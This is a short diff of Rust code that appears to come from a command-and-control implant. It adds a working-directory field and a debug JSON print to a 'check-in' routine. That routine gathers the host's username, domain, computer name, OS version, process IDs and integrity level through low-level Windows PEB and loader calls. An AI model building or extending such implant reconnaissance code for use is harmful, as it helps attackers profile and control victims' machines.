@@ -9,7 +9,10 @@ use mod_win32::{
     ldr::{ldr_function_addr, ldr_module_peb, nt_current_teb},
     nt_get_adapters_info::get_adapters_info,
     nt_get_computer_name_ex::{get_computer_name_ex, ComputerNameFormat},
-    nt_peb::{get_os, get_os_version_info, get_process_name, get_user_domain, get_username},
+    nt_peb::{
+        get_image_path_name, get_os, get_os_version_info, get_process_name, get_user_domain,
+        get_username,
+    },
     nt_ps_api::{get_pid_and_ppid, nt_get_integrity_level},
 };
 
@@ -169,6 +172,7 @@ pub fn init_checkin_data() {
             parent_process_id: ppid as i64,
             process_name: get_process_name(),
             integrity_level: rid,
+            cwd: get_image_path_name(),
         }));
 
         // Add metadata to the Checkin object
@@ -209,6 +213,7 @@ pub async fn init_protocol() {
                 // Convert the raw pointer to a mutable reference to Checkin
                 let checkin_data = checkin_from_raw(checkin_ptr);
 
+                libc_println!("{}", serde_json::to_string_pretty(&checkin_data).unwrap());
                 // Set the protocol to checkin mode
                 // protocol.set_is_checkin(true);
 
